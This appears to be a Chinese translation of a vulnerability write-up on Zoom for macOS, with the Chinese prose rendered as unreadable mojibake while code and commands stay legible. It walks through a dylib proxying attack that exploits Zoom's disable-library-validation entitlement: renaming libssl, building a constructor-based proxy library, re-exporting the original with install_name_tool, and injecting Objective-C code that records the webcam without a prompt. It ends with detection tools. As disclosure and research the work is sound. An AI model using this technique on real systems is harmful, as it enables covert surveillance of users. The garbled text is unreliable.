è‹¹æœå…¬å¸å‚åŠ äº†2016å¹´åœ¨è«æ–¯ç§‘ä¸¾è¡Œçš„[ZeroNights](https://twitter.com/ZeroNights)å¤§ä¼šï¼Œæˆ‘åœ¨ä¼šè®®ä¸Šæ³¨æ„åˆ°è¯¥åŠŸèƒ½å°†å¯¹macOSçš„å®‰å…¨èµ·åˆ°å¾ˆå¤§ä½œç”¨ï¼š<br>[![](https://p1.ssl.qhimg.com/t01175e4b4525f3d0d2.jpg)](https://p1.ssl.qhimg.com/t01175e4b4525f3d0d2.jpg)<br>
æˆ‘ä»¬å¯ä»¥é€šè¿‡codesignå·¥å…·æ£€æŸ¥Zoomï¼ˆæˆ–å…¶ä»–ä»»ä½•åº”ç”¨ç¨‹åºï¼‰æ˜¯å¦å·²ä½¿ç”¨â€œ Hardened Runtimeâ€è¿›è¡Œæœ‰æ•ˆç­¾åå’Œç¼–è¯‘ã€‚

```
$ codesign -dvvv /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
Identifier=us.zoom.xos
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=663 flags=0x10000(runtime) hashes=12+5 location=embedded

...
Authority=Developer ID Application: Zoom Video Communications, Inc. (BJ4HAAB9B3)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
```

flagså€¼ä¸º0x10000ï¼ˆruntimeï¼‰è¡¨ç¤ºåº”ç”¨ç¨‹åºæ˜¯ä½¿ç”¨â€œ Hardened Runtimeâ€é€‰é¡¹ç¼–è¯‘çš„ã€‚å› æ­¤ï¼Œè¿è¡Œæ—¶åº”ç”±macOSå¯¹æ­¤åº”ç”¨ç¨‹åºå¼ºåˆ¶æ‰§è¡Œã€‚

åˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆå¥½ï¼æ­£ç¡®åœ°å®æ–½Hardened Runtimeä¼šé˜»æ­¢ä»£ç æ³¨å…¥ç­‰è¿™ä¸€ç±»å‹çš„æ”»å‡»ã€‚

ç„¶è€Œï¼Œæˆ‘ç»ˆç©¶è¿˜æ˜¯å‘ç°äº†Zoomåœ¨å®ç°è¿™ä¸€ç‰¹æ€§ä¸Šçš„é—®é¢˜ğŸ˜…ã€‚

æˆ‘ä»¬å†æ¬¡é€šè¿‡codesignå·¥å…·dumpå‡ºZoomçš„entitlementsï¼ˆentitlementsæ˜¯ä»£ç ç­¾ååçš„åŠŸèƒ½æˆ–å¼‚å¸¸ï¼‰ã€‚

```
codesign -d --entitlements :- /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN...&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
  &lt;key&gt;com.apple.security.automation.apple-events&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.device.audio-input&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.device.camera&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.cs.disable-executable-page-protection&lt;/key&gt;
  &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

ç”±äºZooméœ€è¦(ç”¨æˆ·æ‰¹å‡†çš„)éº¦å…‹é£å’Œæ‘„åƒå¤´è®¿é—®æƒé™ï¼Œå› æ­¤éœ€è¦com.apple.security.device.audio-inputå’Œcom.apple.security.device.cameraè¿™ä¿©ä¸ªentitlements ã€‚

ç„¶è€Œcom.apple.security.cs.disable-library-validationè¿™ä¸€entitlementéå¸¸æœ‰è¶£ï¼Œç®€å•æ¥è¯´ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯å‘Šè¯‰macOSï¼Œæˆ‘æ—¢æƒ³è¦**â€œHardened Runtimeâ€**ï¼Œåˆæƒ³å…è®¸ä»»ä½•åº“åŠ è½½åˆ°æˆ‘çš„åœ°å€ç©ºé—´ä¸­ã€‚æ¢å¥è¯è¯´ä»£ç æ³¨å…¥æ˜¯å¯è¡Œçš„äº†ï¼

Appleå®˜æ–¹æœ‰å…³äºæ­¤entitlementçš„ä»‹ç»ï¼š<br>[![](https://p0.ssl.qhimg.com/t01813b9f3aaff4dd72.png)](https://p0.ssl.qhimg.com/t01813b9f3aaff4dd72.png)<br>
å› æ­¤ï¼Œç”±äºè¿™ç§entitlementçš„å­˜åœ¨ï¼Œæˆ‘ä»¬(ç†è®ºä¸Š)å¯ä»¥ç»•è¿‡â€œHardened Runtimeâ€ï¼Œå¹¶å°†æ¶æ„åº“ä»£ç æ³¨å…¥Zoomä¸­(ä¾‹å¦‚ï¼Œåœ¨æ²¡æœ‰è®¿é—®è­¦å‘Šçš„æƒ…å†µä¸‹è®¿é—®éº¦å…‹é£å’Œæ‘„åƒå¤´)ã€‚

æœ‰å¤šç§æ–¹æ³•å¯ä»¥å¼ºåˆ¶è¿œç¨‹è¿›ç¨‹åœ¨åŠ è½½æˆ–è¿è¡Œæ—¶åŠ è½½åŠ¨æ€åº“ã€‚è¿™é‡Œæˆ‘ä»¬å°†é‡ç‚¹ä»‹ç»ä¸€å«åš`dylib proxying`çš„æ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•æ—¢éšè”½åˆæŒä¹…ï¼Œæ·±å—æ¶æ„è½¯ä»¶ä½œè€…å–œçˆ±ã€‚

`dylib proxying`ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯æˆ‘ä»¬æ›¿æ¢äº†ç›®æ ‡ï¼ˆå³Zoomï¼‰æ‰€ä¾èµ–çš„åˆæ³•åº“æ–‡ä»¶ï¼Œç„¶åå°†Zoomå‘å‡ºçš„æ‰€æœ‰è¯·æ±‚ä»£ç†å›åŸå§‹åº“æ–‡ä»¶ï¼Œä»¥ç¡®ä¿ç¨‹åºåŠŸèƒ½æ­£å¸¸ä½¿ç”¨ã€‚

`dylib proxying`çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯å®ƒä¸ä¼šæŸå®³äºŒè¿›åˆ¶æ–‡ä»¶çš„ä»£ç ç­¾åè¯ä¹¦ï¼ˆä½†æ˜¯ï¼Œå®ƒå¯èƒ½ä¼šå½±å“ç¨‹åºé›†çš„ç­¾åï¼‰ã€‚ä»è€ŒAppleåœ¨è¿è¡Œæ—¶è¿›è¡Œçš„ç­¾åæ£€æŸ¥(å¦‚å¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®)ä¸ä¼šæ£€æµ‹åˆ°æ¶æ„åº“æ–‡ä»¶ï¼Œå› æ­¤ä»ç„¶å¯ä»¥ä¿æŒå¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®æƒé™ã€‚

è¿™æ˜¯æˆ‘åœ¨æ¼æ´åˆ©ç”¨ä¸­ç»å¸¸ä½¿ç”¨çš„ä¸€ç§æ–¹æ³•ï¼Œä¾‹å¦‚ï¼ˆä»¥å‰ï¼‰ç»•è¿‡SIPï¼š<br>[![](https://p2.ssl.qhimg.com/t0132a8ab9762544177.png)](https://p2.ssl.qhimg.com/t0132a8ab9762544177.png)<br>
å¦‚å›¾æ‰€ç¤ºï¼Œæ”»å‡»è€…å¯ä»¥ä»£ç†IASUtilitiesåº“ï¼Œè¿™æ ·macOSåŠ¨æ€é“¾æ¥å™¨(dyld)å°±ä¼šè‡ªåŠ¨å°†æ¶æ„ä»£ç åŠ è½½(â€œæ³¨å…¥â€)åˆ°Appleçš„å®‰è£…å™¨ä¸­(SIPç»•è¿‡æ”»å‡»çš„å…ˆå†³æ¡ä»¶)ã€‚

å›åˆ°Zoomçš„é—®é¢˜ä¸Šï¼Œæˆ‘ä»¬å°†ä»¥ç±»ä¼¼çš„æ–¹æ³•ä»£ç†ä¸€ä¸ªåº“(Zooméœ€è¦çš„)ï¼Œä½¿å¾—æ¶æ„åº“æ–‡ä»¶åœ¨å¯åŠ¨æ—¶å¯ä»¥è‡ªåŠ¨åŠ è½½åˆ°Zoomçš„å¯ä¿¡è¿›ç¨‹åœ°å€ç©ºé—´ã€‚

ä¸ºäº†ç¡®å®šZoomåœ¨è¿è¡Œæ—¶é“¾æ¥äº†å“ªäº›åº“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡macOSåŠ¨æ€åŠ è½½ç¨‹åºè‡ªåŠ¨åŠ è½½Zoomï¼Œä¹‹åä½¿ç”¨otoolå·¥å…·é€šè¿‡Lå‚æ•°å°†å…¶æ˜¾ç¤ºå‡ºæ¥ï¼š

```
$ otool -L /Applications/zoom.us.app/Contents/MacOS/zoom.us 
/Applications/zoom.us.app/Contents/MacOS/zoom.us:
  @rpath/curl64.framework/Versions/A/curl64
  /System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa
  /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
  /usr/lib/libobjc.A.dylib
  /usr/lib/libc++.1.dylib
  /usr/lib/libSystem.B.dylib
  /System/Library/Frameworks/AppKit.framework/Versions/C/AppKit
  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation
  /System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices
```

ç”±äºmacOSçš„ç³»ç»Ÿå®Œæ•´æ€§ä¿æŠ¤(SIP)ï¼Œæˆ‘ä»¬ä¸èƒ½æ›¿æ¢æ‰ä»»ä½•ç³»ç»Ÿåº“ã€‚<br>
å› æ­¤ï¼Œå¦‚æœæƒ³å¯¹ä¸€ä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨dylib proxyingï¼Œå…ˆå†³æ¡ä»¶å°±æ˜¯ç¨‹åºå¿…é¡»ä»å®ƒè‡ªå·±çš„åŒ…æˆ–å¦ä¸€ä¸ªéSIPçš„ä½ç½®åŠ è½½ä¸€ä¸ªåº“(è€Œä¸”è¿™ä¸ªåº“å¿…é¡»æ˜¯æœªç»è¿‡â€œhardened runtimeâ€ç¼–è¯‘çš„(é™¤éå®ƒæœ‰com.apple.security.cs.disable-library-validationè¿™ä¸€entitlement)ï¼‰ã€‚

è§‚å¯ŸZoomçš„çš„åº“ä¾èµ–ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°[@rpath](https://github.com/rpath)/curl64.framework/Versions/A/curl64ï¼Œé€šè¿‡å¸¦-lå‚æ•°çš„otoolå·¥å…·è§£æå‡ºå…¶è¿è¡Œè·¯å¾„ï¼ˆ[@rpath](https://github.com/rpath)ï¼‰ï¼š

```
$ otool -l /Applications/zoom.us.app/Contents/MacOS/zoom.us 
...

Load command 22
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks (offset 12)
```

[@executable_path](https://github.com/executable_path)å°†åœ¨è¿è¡Œæ—¶è§£æä¸ºäºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ï¼Œå› æ­¤dylibå°†ä»ä»¥ä¸‹ä½ç½®åŠ è½½ï¼š/Applications/zoom.us.app/Contents/MacOS/../Frameworksï¼Œæ›´å…·ä½“ä¸€ç‚¹æ˜¯/Applications/zoom.us.app/Contents/Frameworksã€‚

é€šè¿‡Zoomçš„åº”ç”¨ç¨‹åºåŒ…ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤curlçš„å­˜åœ¨ï¼ˆä»¥åŠå…¶ä»–è®¸å¤šæ¡†æ¶å’Œåº“ï¼‰ä¸”ä»–ä»¬ä¼šåœ¨Zoomå¯åŠ¨æ—¶å…¨éƒ¨åŠ è½½ï¼š<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01909280c89c777bf3.png)<br>
å¯¹äºè¿è¡Œè·¯å¾„ï¼ˆ[@rpath](https://github.com/rpath)ï¼‰ã€æ‰§è¡Œè·¯å¾„ï¼ˆexecutable_pathï¼‰å’Œproxy dylibçš„æ›´å¤šç»†èŠ‚ï¼Œè¯·ç§»æ­¥ä»¥ä¸‹é“¾æ¥ï¼š

[â€œDylib Hijacking on OS Xâ€](https://www.virusbulletin.com/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)

ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å°†Zoomçš„libssl.1.0.0.dylibï¼ˆå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åº“ï¼Œè€Œä¸æ˜¯æ¡†æ¶/åŒ…ï¼‰ä½œä¸ºä¸ºæˆ‘ä»¬è¦ä»£ç†çš„åº“ã€‚

é¦–å…ˆï¼Œé‡å‘½ååˆæ³•åº“ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨åº“æ–‡ä»¶åå‰åŠ ä¸€ä¸ªå‰ç¼€ï¼š`_libssl.1.0.0.dylib`ã€‚

ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬å†è¿è¡ŒZoomï¼Œä¼šé€ æˆæ„æ–™ä¹‹ä¸­çš„å´©æºƒï¼Œå› ä¸ºç¼ºå°‘å¿…è¦çš„åº“ï¼ˆlibssl.1.0.0.dylibï¼‰ã€‚

```
patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
dyld: Library not loaded: @rpath/libssl.1.0.0.dylib
Referenced from: /Applications/zoom.us.app/Contents/Frameworks/curl64.framework/Versions/A/curl64
Reason: image not found
Abort trap: 6
```

è¿™å®é™…ä¸Šæ˜¯ä¸ªå¥½æ¶ˆæ¯ï¼Œå› ä¸ºè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬å°†ä»»ä½•åä¸ºlibssl.1.0.0.dylibçš„åº“æ”¾åœ¨Zoomçš„Frameworksç›®å½•ä¸‹ï¼Œdyldå°†ä¼šï¼ˆç›²ç›®åœ°ï¼‰å°è¯•åŠ è½½å®ƒã€‚

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå®šä¹‰çš„constructoråˆ›å»ºä¸€ä¸ªç®€å•çš„åº“ï¼ˆåŠ è½½åº“æ—¶å°†è‡ªåŠ¨è°ƒç”¨ï¼‰ï¼š

```
1__attribute__((constructor))
 2static void constructor(void)
 3`{`
 4    char path[PROC_PIDPATHINFO_MAXSIZE];
 5    proc_pidpath (getpid(), path, sizeof(path)-1);
 6    
 7    NSLog(@"zoom zoom: loaded in %d: %s", getpid(), path);
 8
 9    return;
10`}`
```

å¹¶å°†å…¶ä¿å­˜è‡³/Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylibã€‚

ä¹‹åï¼Œé‡æ–°è¿è¡ŒZoomï¼š

```
patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
zoom zoom: loaded in 39803: /Applications/zoom.us.app/Contents/MacOS/zoom.us
```

å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„åº“è¢«ZoomæˆåŠŸåŠ è½½~

ä½†ç´§æ¥ç€Zoomå°±é—ªé€€æ‰äº†ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„libssl.1.0.0.dylibä¸æ˜¯ä¸€ä¸ªsslåº“ï¼Œæä¾›ä¸äº†ä»»ä½•ç¨‹åºéœ€è¦çš„åŠŸèƒ½ï¼Œæ‰€ä»¥Zoomæ— æ³•å¯åŠ¨ã€‚

ä¸å¿…æ‹…å¿ƒï¼Œè¿™æ­£æ˜¯dylib proxyingçš„ç”¨æ­¦ä¹‹åœ°ã€‚

æ¥ä¸‹æ¥ï¼Œé€šè¿‡ç®€å•çš„é“¾æ¥å™¨æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å‘Šè¯‰Zoomï¼Œâ€œè™½ç„¶æˆ‘ä»¬çš„åº“æ²¡æœ‰å®ç°æ‚¨è¦æŸ¥æ‰¾çš„å¿…éœ€ï¼ˆsslï¼‰åŠŸèƒ½ï¼Œä½†æˆ‘ä»¬çŸ¥é“è°å¯ä»¥æä¾›â€ï¼Œä¹‹åå°†ZoomæŒ‡å‘åŸå§‹ï¼ˆåˆæ³•ï¼‰çš„sslåº“ï¼ˆä¹Ÿå°±æ˜¯è¢«æˆ‘ä»¬é‡å‘½åä¸º_libssl.1.0.0.dylibçš„åº“ï¼‰ã€‚

æ•´ä½“æµç¨‹å›¾å¦‚ä¸‹ï¼š<br>[![](https://p0.ssl.qhimg.com/t016158bdfe6db6ee55.png)](https://p0.ssl.qhimg.com/t016158bdfe6db6ee55.png)<br>
ä¸ºäº†åˆ›å»ºæ‰€éœ€çš„é“¾æ¥å™¨æŒ‡ä»¤ï¼Œæˆ‘ä»¬åœ¨Xcodeçš„â€œ`Other Linker Flags`â€ ä¸‹æ·»åŠ -XLinker -reexport_libraryï¼Œç„¶åæ·»åŠ ç›®æ ‡ä»£ç†åº“çš„è·¯å¾„ï¼š<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f71f63a6c8a35610.png)<br>
è¦å®Œæˆä»£ç†åº“çš„åˆ›å»ºï¼Œæˆ‘ä»¬è¿˜å¿…é¡»æ›´æ–°åµŒå…¥å¼é‡å¯¼å‡ºè·¯å¾„reexportï¼ˆåœ¨æˆ‘ä»¬çš„ä»£ç†dylibä¸­ï¼‰ï¼Œä»¥ä¾¿å®ƒæŒ‡å‘ï¼ˆè™½ç„¶å·²é‡å‘½åï¼‰sslåº“ã€‚Appleä¸ºæ­¤æä¾›äº†install_name_toolå·¥å…·ï¼š

```
patrick$ install_name_tool -change @rpath/libssl.1.0.0.dylib /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib  /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib
```

ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ï¼ˆé€šè¿‡otoolï¼‰ç¡®è®¤æˆ‘ä»¬çš„ä»£ç†åº“å¼•ç”¨äº†åŸå§‹çš„sslåº“ã€‚å…·ä½“æ¥è¯´å°±æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°åœ¨ä»£ç†dylibä¸­ï¼ˆlibssl.1.0.0.dylibï¼‰åŒ…å«ä¸€ä¸ªLC_REEXPORT_DYLIBï¼Œå®ƒæŒ‡å‘åŸå§‹çš„sslåº“ï¼ˆ_libssl.1.0.0.dylibï¼‰ï¼š

```
patrick$ otool -l /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib 

...
Load command 11
          cmd LC_REEXPORT_DYLIB
      cmdsize 96
         name /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib
   time stamp 2 Wed Dec 31 14:00:02 1969
      current version 1.0.0
compatibility version 1.0.0
```

é‡æ–°è¿è¡ŒZoomç¡®è®¤æˆ‘ä»¬çš„ä»£ç†åº“ï¼ˆå’ŒåŸå§‹sslåº“ï¼‰å‡å·²åŠ è½½ï¼Œå¹¶ä¸”Zoomå¯ä»¥æ­£å¸¸åœ°è¿è¡Œï¼ğŸ”¥<br>[![](https://p5.ssl.qhimg.com/t01402d7329f7846122.png)](https://p5.ssl.qhimg.com/t01402d7329f7846122.png)<br>
å‘Zoomæ³¨å…¥æ¶æ„åº“ä»£ç çš„é­…åŠ›åœ¨äºå…¶ï¼ˆç”¨æˆ·æˆäºˆçš„ï¼‰å¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®æƒé™ã€‚å°†æˆ‘ä»¬çš„æ¶æ„ç¨‹åºåº“åŠ è½½åˆ°Zoomçš„è¿›ç¨‹/åœ°å€ç©ºé—´åï¼Œ**è¯¥åº“å°†è‡ªåŠ¨ç»§æ‰¿Zoomçš„æ‰€æœ‰è®¿é—®æƒé™**ã€‚

è¿™æ„å‘³ç€ï¼Œå¦‚æœç”¨æˆ·ä¸ºZoomæä¾›äº†å¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®æƒé™ï¼ˆä¸€ç§å¯èƒ½çš„æƒ…å†µï¼‰ï¼Œåˆ™æˆ‘ä»¬æ³¨å…¥çš„åº“ä¹Ÿæ‹¥æœ‰è®¿é—®è¿™äº›è®¾å¤‡çš„åŒç­‰æƒé™ã€‚

å¦‚æœå°šæœªæˆäºˆZoomè®¿é—®éº¦å…‹é£æˆ–æ‘„åƒå¤´çš„æƒé™ï¼Œåˆ™æˆ‘ä»¬çš„æ¶æ„åº“åº”èƒ½å¤Ÿæ£€æµ‹åˆ°è¯¥æƒ…å†µå¹¶ä½œå‡ºååº”ï¼ˆæ‚„æ‚„å…³é—­ï¼‰ã€‚æˆ–è€…æˆ‘ä»¬å¯ä»¥ç»§ç»­å°è¯•è®¿é—®è®¾å¤‡ï¼Œå› ä¸ºè®¿é—®æç¤ºå°†â€œåˆæ³•åœ°â€ä»Zoomå‘å‡ºï¼Œå› æ­¤å¾ˆå¯èƒ½ä¼šç”±ä¸çŸ¥æƒ…çš„ç”¨æˆ·æ‰¹å‡†ã€‚

ä¸ºäº†æµ‹è¯•è¿™ç§â€œè®¿é—®æƒé™çš„ç»§æ‰¿â€ï¼Œæˆ‘å‘æ³¨å…¥çš„åº“ä¸­æ·»åŠ äº†ä¸€äº›ä»£ç ï¼Œæ¥å½•åˆ¶å‡ ç§’é’Ÿçš„ç½‘ç»œæ‘„åƒå¤´è§†é¢‘ï¼š

```
1 
 2  AVCaptureDevice* device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
 3    
 4  session = [[AVCaptureSession alloc] init];
 5  output = [[AVCaptureMovieFileOutput alloc] init];
 6  
 7  AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device 
 8                                error:nil];
 9
10  movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
11  
12  [self.session addInput:input];
13  [self.session addOutput:output];
14  [self.session addOutput:movieFileOutput];
15  
16  [self.session startRunning];
17  
18  [movieFileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"zoom.mov"] 
19                   recordingDelegate:self];
20  
21  //stop recoding after 5 seconds
22  [NSTimer scheduledTimerWithTimeInterval:5 target:self 
23           selector:@selector(finishRecord:) userInfo:nil repeats:NO];
24  
25  ...
```

åœ¨æ­£å¸¸æƒ…å†µä¸‹æ­¤ä»£ç ä¼šè§¦å‘æ¥è‡ªmacOSçš„è­¦æŠ¥ï¼Œè¦æ±‚ç”¨æˆ·ç¡®è®¤å¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®ã€‚ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬å°†å…¶æ³¨å…¥Zoomï¼ˆå·²ç”±ç”¨æˆ·ç¡®è®¤è®¿é—®ï¼‰æ—¶ï¼Œå°†ä¸ä¼šæ˜¾ç¤ºå…¶ä»–æç¤ºï¼Œå¹¶ä¸”æ³¨å…¥çš„ä»£ç å¯ä»¥ä»»æ„å½•åˆ¶éŸ³é¢‘å’Œè§†é¢‘ã€‚

è¿™é¡¹æµ‹è¯•æ‹ä¸‹äº†è¿™é¡¹ç ”ç©¶èƒŒåçœŸæ­£çš„ä¸»å¯¼è€…ï¼ˆç‹—å¤´ä¿å‘½ï¼‰ï¼š<br>[![](https://p2.ssl.qhimg.com/t0118a882e920814dee.png)](https://p2.ssl.qhimg.com/t0118a882e920814dee.png)<br>
æ¶æ„è½¯ä»¶æ˜¯å¦å¯ä»¥åœ¨ä»»æ„æ—¶é—´ä½¿ç”¨Zoomæ•è·éŸ³é¢‘å’Œè§†é¢‘ï¼ˆå³ç›‘è§†ç”¨æˆ·ï¼‰ã€‚å¦‚æœå®‰è£…äº†Zoomå¹¶è¢«æˆäºˆè®¿é—®éº¦å…‹é£å’Œæ‘„åƒå¤´çš„æƒé™ï¼Œé‚£ä¹ˆç­”æ¡ˆæ˜¾è€Œæ˜“è§ï¼šå¯ä»¥ï¼åŒæ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡/usr/bin/open -j å°†ç¨‹åºéšè—èµ·æ¥ã€‚



## æ€»ç»“

æˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªå½±å“Zoomï¼ˆmacOSç‰ˆæœ¬ï¼‰æœ¬åœ°å®‰å…¨çš„æ¼æ´ã€‚é‰´äºZoomä¸€ç›´ä»¥æ¥åœ¨éšç§å’Œå®‰å…¨æ–¹é¢çš„ä¸è‰¯è¡¨ç°ï¼Œè¿™ä¹Ÿæ˜¯åœ¨æˆ‘ä»¬çš„æ„æ–™ä¹‹ä¸­ã€‚

é¦–å…ˆï¼Œæˆ‘ä»¬å±•ç¤ºäº†æ— ç‰¹æƒæ”»å‡»è€…æˆ–æ¶æ„è½¯ä»¶å¦‚ä½•åˆ©ç”¨Zoomçš„å®‰è£…å™¨è·å–rootæƒé™ã€‚

ä¹‹åï¼Œç”±äºç‰¹æ®Šçš„entitlementï¼Œæˆ‘ä»¬æˆåŠŸå±•ç¤ºäº†å¦‚ä½•å°†æ¶æ„åº“æ³¨å…¥åˆ°Zoomçš„å—ä¿¡ä»»è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­ã€‚è¿™ä½¿å¾—æ¶æ„è½¯ä»¶èƒ½å¤Ÿè®°å½•æ‰€æœ‰Zoomä¼šè®®ï¼Œç”šè‡³æ˜¯åœ¨åå°å¯åŠ¨Zoomçš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿåœ¨ä»»æ„æ—¶é—´è®¿é—®ç”¨æˆ·çš„éº¦å…‹é£å’Œç½‘ç»œæ‘„åƒå¤´ï¼ğŸ˜±

å‰è€…çš„é—®é¢˜åœ¨äºè®¸å¤šä¼ä¸šï¼ˆç°åœ¨ï¼‰ä½¿ç”¨Zoomæ¥ï¼ˆå¯èƒ½ï¼‰è¿›è¡Œæ•æ„Ÿçš„å•†åŠ¡ä¼šè®®ï¼Œè€Œåè€…çš„é—®é¢˜åœ¨äºå³ä½¿æ²¡æœ‰macOSè­¦æŠ¥æˆ–æç¤ºï¼Œæ¶æ„è½¯ä»¶ä»ç„¶å¯ä»¥ç§˜å¯†åœ°è®¿é—®éº¦å…‹é£æˆ–ç½‘ç»œæ‘„åƒå¤´ã€‚<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d89190af4e048ec5.png)

### <a class="reference-link" name="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"></a>è§£å†³æ–¹æ³•

è€å®è¯´ï¼Œå¦‚æœæ‚¨å…³å¿ƒè‡ªå·±çš„å®‰å…¨æˆ–éšç§ï¼Œå¯ä»¥è€ƒè™‘åœæ­¢ä½¿ç”¨Zoomã€‚å¦‚æœå¿…é¡»ä½¿ç”¨Zoomï¼Œå¯ä»¥ä½¿ç”¨æˆ‘ç¼–å†™çš„ä¸€äº›å…è´¹å·¥å…·æ¥å¸®åŠ©æ£€æµ‹è¿™äº›æ”»å‡»ã€‚ğŸ˜‡

é¦–å…ˆï¼Œ [OverSight](https://objective-see.com/products/oversight.html)å¯ä»¥åœ¨ä»»ä½•äººä»»ä½•æ—¶é—´è®¿é—®æ‚¨çš„éº¦å…‹é£å’Œæ‘„åƒå¤´æ—¶æé†’æ‚¨ï¼š<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e521b9b707012fb7.png)<br>
å› æ­¤ï¼Œå³ä½¿æ”»å‡»è€…æˆ–æ¶æ„è½¯ä»¶åœ¨åå°è¿è¡ŒZoomï¼ŒOverSightä¹Ÿä¼šç”Ÿæˆè­¦æŠ¥ã€‚

å¦ä¸€ä¸ªï¼ˆå…è´¹ï¼‰å·¥å…·æ˜¯ [KnockKnock](https://objective-see.com/products/knockknock.html)ï¼Œå¯ä»¥æ£€æµ‹ä»£ç†åº“ï¼š<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0176a88f92d699b29a.png)
